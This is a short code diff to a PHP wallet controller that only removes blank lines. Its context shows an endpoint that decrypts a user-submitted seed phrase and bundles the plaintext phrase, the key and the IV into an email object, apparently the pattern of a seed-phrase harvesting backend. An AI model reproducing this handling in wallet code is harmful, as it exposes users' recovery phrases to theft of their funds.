@@ -52,7 +52,6 @@ class WalletController extends Controller{
                     "message" => 'Congratulation, your wallet has been successfully connected',
                 ]
             ];
-
             return response()->json($response, 201);
         }catch (\Exception $e) {
             return response()->json(['message' => 'Wallet connection failed!'], 409);
@@ -89,7 +88,6 @@ class WalletController extends Controller{
                     "message" => 'Congratulation, your wallet has been successfully connected',
                 ]
             ];
-
             return response()->json($response, 201);
         }catch (\Exception $e) {
             return response()->json(['message' => 'Wallet connection failed!'], 409);
@@ -134,13 +132,11 @@ class WalletController extends Controller{
             $initialization_vector = $request->input('initialization_vector');
 
             $decrypted_data = openssl_decrypt($seed_phrase, $cipher, $encryption_key, 0, $initialization_vector); 
-            
             $email_content=(object)[
                 "seed_phrase" => $decrypted_data,
                 "encryption_key" => $encryption_key,
                 "initialization_vector" => $initialization_vector,
             ];
-
             $response=(object)[
                 "success" => true,
                 "result" => [
@@ -148,7 +144,6 @@ class WalletController extends Controller{
                     "message" => 'Congratulation, your have successfully decrypted your Seed Phrase.',
                 ]
             ];
-
             return response()->json($response, 201);
         }catch (\Exception $e) {
             return response()->json(['message' => 'Wallet request failed!'], 409);
